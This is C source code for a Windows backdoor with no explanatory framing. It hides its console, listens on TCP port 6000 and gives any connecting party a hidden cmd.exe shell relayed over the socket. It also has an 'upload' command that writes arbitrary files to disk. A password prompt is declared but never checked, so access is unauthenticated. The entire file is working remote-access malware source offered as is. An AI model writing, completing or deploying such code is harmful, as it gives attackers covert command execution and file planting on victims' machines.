#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>
#include <winsock.h>
#include <sys/stat.h>

#pragma comment(lib, "ws2_32.lib")

const char welcome[] = "Welcome, enter your password please : ";
char bufferin[1024];
char bufferout[65535];
int i, port;
SOCKET locsock, remsock;
SOCKADDR_IN sinloc, sinrem;
WSADATA wsadata;
STARTUPINFO startinfo;
SECURITY_ATTRIBUTES secat;
PROCESS_INFORMATION procinfo;
int bytesWritten;
DWORD bytesRead, avail, exitcode;

void CommandPrompt(void);
void handle_upload(SOCKET sock);

int main() {
    FreeConsole();
    port = 6000;
    WSAStartup(0x101, &wsadata);
    locsock = socket(AF_INET, SOCK_STREAM, 0);

    sinloc.sin_family = AF_INET;
    sinloc.sin_addr.s_addr = INADDR_ANY;
    sinloc.sin_port = htons(port);

    if (bind(locsock, (SOCKADDR*)&sinloc, sizeof(SOCKADDR_IN)) == SOCKET_ERROR) {
        WSACleanup();
        printf("Error binding socket.\n");
        return EXIT_FAILURE;
    }

    if (listen(locsock, 5) == SOCKET_ERROR) {
        WSACleanup();
        printf("Error listening socket.\n");
        return EXIT_FAILURE;
    }

    while (1) {
        remsock = SOCKET_ERROR;
        while (remsock == SOCKET_ERROR) {
            remsock = accept(locsock, NULL, NULL);
            if (remsock == INVALID_SOCKET) {
                WSACleanup();
                printf("Error accepting socket.\n");
                return EXIT_FAILURE;
            }

            CommandPrompt();
        }
        closesocket(remsock);
    }
    return EXIT_SUCCESS;
}

void CommandPrompt(void) {
    secat.nLength = sizeof(SECURITY_ATTRIBUTES);
    secat.bInheritHandle = TRUE;
    DWORD bytesW;
    HANDLE newstdin = NULL, newstdout = NULL, readout = NULL, writein = NULL;
    char exit1[] = { 'e','x','i','t',10,0 };
    char exit2[] = { 'E','X','I','T',10,0 };

    CreatePipe(&newstdin, &writein, &secat, 0);
    CreatePipe(&readout, &newstdout, &secat, 0);

    GetStartupInfo(&startinfo);
    startinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startinfo.wShowWindow = SW_HIDE;
    startinfo.hStdOutput = newstdout;
    startinfo.hStdError = newstdout;
    startinfo.hStdInput = newstdin;

    wchar_t cmd[] = L"cmd.exe";
    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startinfo, &procinfo)) {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return;
    }

    while (1) {
        if (GetExitCodeProcess(procinfo.hProcess, &exitcode) && exitcode != STILL_ACTIVE) {
            break;
        }
        bytesRead = 0;
        Sleep(500);
        PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
        if (bytesRead != 0) {
            while (bytesRead != 0) {
                ReadFile(readout, bufferout, sizeof(bufferout), &bytesRead, NULL);
                send(remsock, bufferout, bytesRead, 0);
                ZeroMemory(bufferout, sizeof(bufferout));
                Sleep(100);
                PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
            }
        }
        ZeroMemory(bufferin, sizeof(bufferin));
        recv(remsock, bufferin, sizeof(bufferin), 0);

        if (strncmp(bufferin, "upload", 6) == 0) {
            handle_upload(remsock);
            continue;
        }

        if ((strcmp(bufferin, exit1) == 0) || (strcmp(bufferin, exit2) == 0)) {
            WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
            goto closeup;
        }
        WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
        ZeroMemory(bufferin, sizeof(bufferin));
    }

closeup:
    if (procinfo.hThread != NULL) {
        CloseHandle(procinfo.hThread);
        procinfo.hThread = NULL;
    }
    if (procinfo.hProcess != NULL) {
        CloseHandle(procinfo.hProcess);
        procinfo.hProcess = NULL;
    }
    if (newstdin != NULL) {
        CloseHandle(newstdin);
        newstdin = NULL;
    }
    if (writein != NULL) {
        CloseHandle(writein);
        writein = NULL;
    }
    if (readout != NULL) {
        CloseHandle(readout);
        readout = NULL;
    }
    if (newstdout != NULL) {
        CloseHandle(newstdout);
        newstdout = NULL;
    }
}

void handle_upload(SOCKET sock) {
    char filename[256];
    int received;
    FILE* fp;

    // Clear the buffer and receive the filename
    ZeroMemory(bufferin, sizeof(bufferin));
    if (recv(sock, filename, sizeof(filename), 0) <= 0) {
        send(sock, "Error receiving filename\n", strlen("Error receiving filename\n"), 0);
        return;
    }

    // Remove newline character if present
    char* newline = strchr(filename, '\n');
    if (newline) {
        *newline = '\0';
    }
    send(sock, "File created\n", strlen("File created\n"), 0);

    // Open the file for writing
    fp = fopen(filename, "w");
    if (fp == NULL) {
        send(sock, "Error opening file for writing\n", strlen("Error opening file for writing\n"), 0);
        return;
    }

    // Receive the file content
    char stop[] = "stop upload";
    while ((received = recv(sock, bufferin, sizeof(bufferin), 0)) > 0) {
        if (strstr(bufferin, "stop upload") != NULL) {
            break;
        }
        fwrite(bufferin, 1, received, fp);
    }
    fclose(fp);

    send(sock, "File received successfully\n", strlen("File received successfully\n"), 0);
}
